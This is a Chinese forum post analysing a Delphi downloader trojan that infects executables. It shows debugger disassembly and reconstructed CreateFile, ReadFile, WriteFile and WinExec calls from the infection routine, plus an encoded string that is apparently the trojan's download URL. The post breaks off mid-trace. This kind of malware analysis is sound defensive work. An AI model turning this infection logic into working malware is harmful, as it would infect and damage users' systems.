
# 一个龌龊的下载者病毒

【病毒名称】`trojan.downloader.win32.delf.ayu`

【分析环境】`vmware+win2000+vc6.0+od`

【说明】今天开机，发现运行程序怪异，运行`\*.exe`程序，会在当前目录下生成`\*~.exe`文件，开始还认为是系统错误，又运行了另一个，还是这个问题，感觉不对，用咔吧大叔扫了下，结果整个系统目录下的exe文件（除系统文件）都报有毒，喀吧不能把正常程序还原，只能全删。当时就一个郁闷。这么多软件，怎么可能全删除，删了还怕系统不稳，只好怒而分析之。hoho，好久没有来论坛了，经验不敢独享，与和我一样迷茫的论坛菜菜们一起共享之。

## 【正文】

`peid`载入感染的程序，显示`Borland Delphi 6.0 - 7.0 [Overlay]`。

用资源文件打开查看`import`：发现`urlmon.dll`->`URLDownLoadToFile()`。这个是典型的下载者的标志.用`od`载入，下断点`bp URLDownloadToFileA`，因为有读写文件，又下了下面几个断点：`bp CreateFileA`, `ReadFile`, `WriteFile`.

`F9`运行，中断后`ALT+F9`

```
00406E99   |.  6A 00          push 0
00406E9B   |.  68 80000000    push 80
00406EA0   |.  6A 03          push 3
00406EA2   |.  6A 00          push 0
00406EA4   |.  8BC3           mov eax,ebx
00406EA6   |.  25 F0000000    and eax,0F0
00406EAB   |.  C1E8 04        shr eax,4
00406EAE   |.  8B0485 4451410>mov eax,dword ptr ds:[eax*4+415144]
00406EB5   |.  50             push eax
00406EB6   |.  8B04B5 3851410>mov eax,dword ptr ds:[esi*4+415138]
00406EBD   |.  50             push eax
00406EBE   |.  8BC7           mov eax,edi
00406EC0   |.  E8 1BD0FFFF    call QQLLK.00403EE0
00406EC5   |.  50             push eax                                                        ; |FileName
00406EC6   |.  E8 75E8FFFF    call <jmp.&kernel32.CreateFileA>                                ; \CreateFileA
00406ECB   |>  5F             pop edi                                                         ;  00C70020
00406ECC   |.  5E             pop esi
00406ECD   |.  5B             pop ebx
00406ECE   \.  C3             retn
```

各参数的意义为：

`CreateFileA("VIRUS.exe", GENERIC_READ, FILE_SHARE_READ,NULL,OPEN_EXISTING,NORMAL, NULL);`

`F9`运行，`ALT+F9` 返回到：

```
00406EFC   /$  53             push ebx
00406EFD   |.  56             push esi
00406EFE   |.  57             push edi
00406EFF   |.  51             push ecx
00406F00   |.  8BF9           mov edi,ecx
00406F02   |.  8BF2           mov esi,edx
00406F04   |.  8BD8           mov ebx,eax
00406F06   |.  6A 00          push 0                                                          ; /pOverlapped = NULL
00406F08   |.  8D4424 04      lea eax,dword ptr ss:[esp+4]                                    ; |
00406F0C   |.  50             push eax                                                        ; |pBytesRead
00406F0D   |.  57             push edi                                                        ; |BytesToRead
00406F0E   |.  56             push esi                                                        ; |Buffer
00406F0F   |.  53             push ebx                                                        ; |hFile
00406F10   |.  E8 4BE9FFFF    call <jmp.&kernel32.ReadFile>                                   ; \ReadFile
00406F15   |.  85C0           test eax,eax
00406F17   |.  75 07          jnz short QQLLK.00406F20
00406F19   |.  C70424 FFFFFFF>mov dword ptr ss:[esp],-1
00406F20   |>  8B0424         mov eax,dword ptr ss:[esp]
00406F23   |.  5A             pop edx
00406F24   |.  5F             pop edi
00406F25   |.  5E             pop esi
00406F26   |.  5B             pop ebx
00406F27   \.  C3             retn
```

函数的表现形式为：

`ReadFile((hFile)0068, (Buffer)00137848, (BytesToRead)29a04, (pBytesRead)0012ff14, NULL);`

`F9`, `ALT+F9`继续到这：

```
00406ED0   /$  53             push ebx
00406ED1   |.  8BD8           mov ebx,eax
00406ED3   |.  6A 00          push 0
00406ED5   |.  68 80000000    push 80
00406EDA   |.  6A 02          push 2
00406EDC   |.  6A 00          push 0
00406EDE   |.  6A 00          push 0
00406EE0   |.  68 000000C0    push C0000000
00406EE5   |.  8BC3           mov eax,ebx
00406EE7   |.  E8 F4CFFFFF    call QQLLK.00403EE0
00406EEC   |.  50             push eax                                                        ; |FileName
00406EED   |.  E8 4EE8FFFF    call <jmp.&kernel32.CreateFileA>                                ; \CreateFileA
00406EF2   |.  5B             pop ebx
00406EF3   \.  C3             retn
00406EF4   /$  E8 D7FFFFFF    call QQLLK.00406ED0
00406EF9   \.  C3             retn
```

函数的表现形式为：

`CreateFile("virus~.exe, GENERIC_READ|GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, NORMAL, NULL);`

同上继续来到：

```
00406F29   |.  56             push esi                                                        ;  QQLLK.0040F628
00406F2A   |.  57             push edi
00406F2B   |.  51             push ecx
00406F2C   |.  8BF9           mov edi,ecx
00406F2E   |.  8BF2           mov esi,edx
00406F30   |.  8BD8           mov ebx,eax
00406F32   |.  6A 00          push 0                                                          ; /pOverlapped = NULL
00406F34   |.  8D4424 04      lea eax,dword ptr ss:[esp+4]                                    ; |
00406F38   |.  50             push eax                                                        ; |pBytesWritten
00406F39   |.  57             push edi                                                        ; |nBytesToWrite
00406F3A   |.  56             push esi                                                        ; |Buffer
00406F3B   |.  53             push ebx                                                        ; |hFile
00406F3C   |.  E8 5FE9FFFF    call <jmp.&kernel32.WriteFile>                                  ; \WriteFile
00406F41   |.  85C0           test eax,eax
00406F43   |.  75 07          jnz short QQLLK.00406F4C
00406F45   |.  C70424 FFFFFFF>mov dword ptr ss:[esp],-1
00406F4C   |>  8B0424         mov eax,dword ptr ss:[esp]
00406F4F   |.  5A             pop edx
00406F50   |.  5F             pop edi
00406F51   |.  5E             pop esi
00406F52   |.  5B             pop ebx
00406F53   \.  C3             retn
```

函数的表现形式为

`WriteFile(hFile, 00161860, 61952, 0012ff1c, NULL);`

一路继续跟踪来到：

```
00413FD4   |.  68 24404100    push QQLLK.00414024
00413FD9   |.  64:FF30        push dword ptr fs:[eax]
00413FDC   |.  64:8920        mov dword ptr fs:[eax],esp
00413FDF   |.  6A 00          push 0
00413FE1   |.  68 00000004    push 4000000
00413FE6   |.  6A 03          push 3
00413FE8   |.  6A 00          push 0
00413FEA   |.  6A 01          push 1
00413FEC   |.  6A 00          push 0
00413FEE   |.  8B45 FC        mov eax,dword ptr ss:[ebp-4]
00413FF1   |.  E8 EAFEFEFF    call QQLLK.00403EE0
00413FF6   |.  8BF0           mov esi,eax                                                     ; |
00413FF8   |.  56             push esi                                              ; |FileName
00413FF9  |. E8 4217FFFF      call <jmp.&kernel32.CreateFileA>
; \CreateFileA
00413FFE   |.  8BD8           mov ebx,eax
00414000   |.  6A 04          push 4                                     ; /ShowState = SW_SHOWNOACTIVATE
00414002   |.  56             push esi                                                        ; |CmdLine
00414003   |.  E8 9018FFFF    call <jmp.&kernel32.WinExec>                                    ; \WinExec
```

`CreateFile("virus~.exe", 0, FILE_SHARE_READ, NULL,OPEN_EXISTIG,DELETE_ON_CLOSE,NULL)`

`WinExec("virus~.exe",SW_SHOWNOACTIVATE).`

后又跟踪来到：

```
004142E9   |. /75 50          jnz short QQLLK.0041433B
004142EB   |. |8D45 F4        lea eax,dword ptr ss:[ebp-C]
004142EE   |. |E8 21FEFFFF    call QQLLK.00414114
004142F3   |. |8D45 F4        lea eax,dword ptr ss:[ebp-C]
004142F6   |. |BA 80434100    mov edx,QQLLK.00414380                                          ;  ASCII "cert.exe"
004142FB   |. |E8 E8F9FEFF    call QQLLK.00403CE8
00414300   |. |8B55 F4        mov edx,dword ptr ss:[ebp-C]
；00414394=QQLLK.00414394 (ASCII "6b7K9s2c8@1M7q4)9K6b7g2)9J5c8W2)9J5c8Y4N6%4N6#2)9J5k6h3N6S2L8h3f1&6z5e0R3^5i4K6u0W2j5$3&6Q4x3V1j5I4z5e0M7&6x3o6t1H3y4g2)9J5k6h3g2^5k6b7`.`.")
00414303   |. |B8 94434100    mov eax,QQLLK.00414394                                          ;  ASCII "ef6K9s2c8@1M7q4)9K6b7g2)9J5c8W2)9J5c8Y4N6%4N6#2)9J5k6h3N6S2L8h3f1&6z5e0R3^5i4K6u0W2j5$3&6Q4x3V1j5I4z5e0M7&6x3o6t1H3y4g2)9J5k6h3g2^5k6b7`.`. "
00414308   |. |E8 03FFFFFF    call QQLLK.00414210
0041430D   |. |84C0           test al,al
```
